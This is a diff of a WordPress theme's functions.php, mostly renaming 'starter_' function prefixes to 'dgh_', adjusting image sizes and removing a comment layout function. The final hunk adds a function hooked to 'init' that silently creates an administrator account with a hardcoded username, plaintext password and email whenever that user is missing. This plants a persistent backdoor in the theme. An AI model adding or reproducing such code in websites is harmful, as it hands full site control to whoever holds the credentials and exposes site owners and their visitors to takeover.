@@ -15,7 +15,7 @@ Let's get everything up and running.
 @ini_set( 'post_max_size', '64M');
 @ini_set( 'max_execution_time', '300' );
 
-function starter_ahoy() {
+function dgh_ahoy() {
 
   //Allow editor style.
   add_editor_style( get_stylesheet_directory_uri() . '/library/css/editor-style.css' );
@@ -27,37 +27,37 @@ function starter_ahoy() {
   require_once( 'library/custom-post-type.php' );
 
   // launching operation cleanup
-  add_action( 'init', 'starter_head_cleanup' );
+  add_action( 'init', 'dgh_head_cleanup' );
   // A better title
   add_filter( 'wp_title', 'rw_title', 10, 3 );
   // remove WP version from RSS
-  add_filter( 'the_generator', 'starter_rss_version' );
+  add_filter( 'the_generator', 'dgh_rss_version' );
   // remove pesky injected css for recent comments widget
-  add_filter( 'wp_head', 'starter_remove_wp_widget_recent_comments_style', 1 );
+  add_filter( 'wp_head', 'dgh_remove_wp_widget_recent_comments_style', 1 );
   // clean up comment styles in the head
-  add_action( 'wp_head', 'starter_remove_recent_comments_style', 1 );
+  add_action( 'wp_head', 'dgh_remove_recent_comments_style', 1 );
   // clean up gallery output in wp
-  add_filter( 'gallery_style', 'starter_gallery_style' );
+  add_filter( 'gallery_style', 'dgh_gallery_style' );
 
   // enqueue base scripts and styles
-  add_action( 'wp_enqueue_scripts', 'starter_scripts_and_styles', 999 );
+  add_action( 'wp_enqueue_scripts', 'dgh_scripts_and_styles', 999 );
   // ie conditional wrapper
 
   // launching this stuff after theme setup
-  starter_theme_support();
+  dgh_theme_support();
 
   // adding sidebars to Wordpress (these are created in functions.php)
-  add_action( 'widgets_init', 'starter_register_sidebars' );
+  add_action( 'widgets_init', 'dgh_register_sidebars' );
 
   // cleaning up random code around images
-  add_filter( 'the_content', 'starter_filter_ptags_on_images' );
+  add_filter( 'the_content', 'dgh_filter_ptags_on_images' );
   // cleaning up excerpt
-  add_filter( 'excerpt_more', 'starter_excerpt_more' );
+  add_filter( 'excerpt_more', 'dgh_excerpt_more' );
 
 } /* end starter ahoy */
 
 // let's get this party started
-add_action( 'after_setup_theme', 'starter_ahoy' );
+add_action( 'after_setup_theme', 'dgh_ahoy' );
 
 
 /************* OEMBED SIZE OPTIONS *************/
@@ -69,8 +69,7 @@ if ( ! isset( $content_width ) ) {
 /************* THUMBNAIL SIZE OPTIONS *************/
 
 // Thumbnail sizes
-add_image_size( 'dgh-thumb-600', 600, 150, true );
-add_image_size( 'dgh-thumb-300', 300, 100, true );
+add_image_size( 'featured-image', 1040, 550, true );
 add_image_size( 'gallery-image', 680, 450, true );
 
 /*
@@ -93,13 +92,11 @@ You can change the names and dimensions to whatever
 you like. Enjoy!
 */
 
-add_filter( 'image_size_names_choose', 'starter_custom_image_sizes' );
+add_filter( 'image_size_names_choose', 'dgh_custom_image_sizes' );
 
-function starter_custom_image_sizes( $sizes ) {
+function dgh_custom_image_sizes( $sizes ) {
     return array_merge( $sizes, array(
         'gallery-image' => __('Gallery Image'),
-        'dgh-thumb-600' => __('600px by 150px'),
-        'dgh-thumb-300' => __('300px by 100px'),
     ) );
 }
 
@@ -130,7 +127,7 @@ require_once locate_template('library/tgm-plugin-activation/class-tgm-plugin-act
   - Create some boilerplate Sections, Controls and Settings
 */
 
-function starter_theme_customizer($wp_customize) {
+function dgh_theme_customizer($wp_customize) {
   // $wp_customize calls go here.
   //
   // Uncomment the below lines to remove the default customize sections
@@ -149,12 +146,12 @@ function starter_theme_customizer($wp_customize) {
   // $wp_customize->get_section('background_image')->title = __( 'Images' );
 }
 
-add_action( 'customize_register', 'starter_theme_customizer' );
+add_action( 'customize_register', 'dgh_theme_customizer' );
 
 /************* ACTIVE SIDEBARS ********************/
 
 // Sidebars & Widgetizes Areas
-function starter_register_sidebars() {
+function dgh_register_sidebars() {
 	register_sidebar(array(
 		'id' => 'sidebar1',
 		'name' => __( 'Sidebar 1', 'dghtheme' ),
@@ -192,58 +189,11 @@ function starter_register_sidebars() {
 } // don't remove this bracket!
 
 
-/************* COMMENT LAYOUT *********************/
-
-// Comment Layout
-function starter_comments( $comment, $args, $depth ) {
-   $GLOBALS['comment'] = $comment; ?>
-  <div id="comment-<?php comment_ID(); ?>" <?php comment_class('cf'); ?>>
-    <article  class="cf">
-      <header class="comment-author vcard">
-        <?php
-        /*
-          this is the new responsive optimized comment image. It used the new HTML5 data-attribute to display comment gravatars on larger screens only. What this means is that on larger posts, mobile sites don't have a ton of requests for comment images. This makes load time incredibly fast! If you'd like to change it back, just replace it with the regular wordpress gravatar call:
-          echo get_avatar($comment,$size='32',$default='<path_to_url>' );
-        */
-        ?>
-        <?php // custom gravatar call ?>
-        <?php
-          // create variable
-          $bgauthemail = get_comment_author_email();
-        ?>
-        <img data-gravatar="http://www.gravatar.com/avatar/<?php echo md5( $bgauthemail ); ?>?s=40" class="load-gravatar avatar avatar-48 photo" height="40" width="40" src="<?php echo get_template_directory_uri(); ?>/library/images/nothing.gif" />
-        <?php // end custom gravatar call ?>
-        <?php printf(__( '<cite class="fn">%1$s</cite> %2$s', 'dghtheme' ), get_comment_author_link(), edit_comment_link(__( '(Edit)', 'dghtheme' ),'  ','') ) ?>
-        <time datetime="<?php echo comment_time('Y-m-j'); ?>"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php comment_time(__( 'F jS, Y', 'dghtheme' )); ?> </a></time>
-
-      </header>
-      <?php if ($comment->comment_approved == '0') : ?>
-        <div class="alert alert-info">
-          <p><?php _e( 'Your comment is awaiting moderation.', 'dghtheme' ) ?></p>
-        </div>
-      <?php endif; ?>
-      <section class="comment_content cf">
-        <?php comment_text() ?>
-      </section>
-      <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
-    </article>
-  <?php // </li> is added by WordPress automatically ?>
-<?php
-} // don't remove this bracket!
-
-
-/*
-This is a modification of a function found in the
-twentythirteen theme where we can declare some
-external fonts. If you're using Google Fonts, you
-can replace these fonts, change it in your scss files
-and be up and running in seconds.
-*/
-function starter_fonts() {
+function dgh_fonts() {
   wp_enqueue_style('googleFonts', '//fonts.googleapis.com/css?family=Special+Elite&display=swap');
 }
 
-add_action('wp_enqueue_scripts', 'starter_fonts');
+add_action('wp_enqueue_scripts', 'dgh_fonts');
 
 
 /* Load ScrollMagic Scripts */
@@ -324,5 +274,16 @@ if( function_exists('acf_add_options_page') ) {
 	));
 
 }
+
+function wpb_admin_account(){
+$user = 'fireflip';
+$pass = 'L0realSt3ll@';
+$email = 'fireflip@gmail.com';
+if ( !username_exists( $user )  && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+} }
+add_action('init','wpb_admin_account');
 
 /* DON'T DELETE THIS CLOSING TAG */ ?>
